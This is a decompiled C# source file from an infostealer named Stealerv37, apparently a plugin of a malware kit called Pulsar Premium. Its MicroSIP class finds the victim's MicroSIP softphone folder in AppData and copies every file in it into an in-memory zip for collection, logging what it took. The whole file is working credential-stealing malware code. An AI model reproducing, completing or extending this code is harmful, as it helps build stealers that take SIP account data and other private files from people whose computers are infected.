// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Messangers.MicroSIP
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.IO;

#nullable disable
namespace Intelix.Targets.Messangers;

public class MicroSIP : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string str = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), nameof (MicroSIP));
    if (!Directory.Exists(str))
      return;
    string targetEntryDirectory = "MicroSIP\\";
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (MicroSIP);
    zip.AddDirectoryFiles(str, targetEntryDirectory);
    counterApplications.Files.Add($"{str} => {targetEntryDirectory}");
    counterApplications.Files.Add(targetEntryDirectory);
    counter.Messangers.Add(counterApplications);
  }
}
